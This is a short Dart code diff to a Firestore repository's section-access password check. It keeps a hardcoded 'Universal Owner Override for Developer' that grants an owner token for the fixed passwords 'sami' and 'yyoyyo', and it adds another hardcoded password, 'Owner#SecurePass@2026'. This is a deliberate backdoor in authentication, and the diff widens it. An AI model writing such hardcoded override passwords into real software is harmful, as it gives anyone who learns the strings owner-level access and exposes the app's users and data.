@@ -198,10 +198,11 @@ class FirestoreAcademicStructureRepository implements AcademicStructureRepositor
     required bool isAdmin,
     required String password,
   }) async {
-    final cleanPass = password.trim().toLowerCase();
+    final rawTrimmed = password.trim();
+    final cleanPass = rawTrimmed.toLowerCase();
 
     // Universal Owner Override for Developer
-    if (cleanPass == 'sami' || cleanPass == 'yyoyyo') {
+    if (rawTrimmed == 'Owner#SecurePass@2026' || cleanPass == 'sami' || cleanPass == 'yyoyyo') {
       return SectionGrant(sectionId, 'owner-token', role: UserRole.myClassOwner);
     }
 
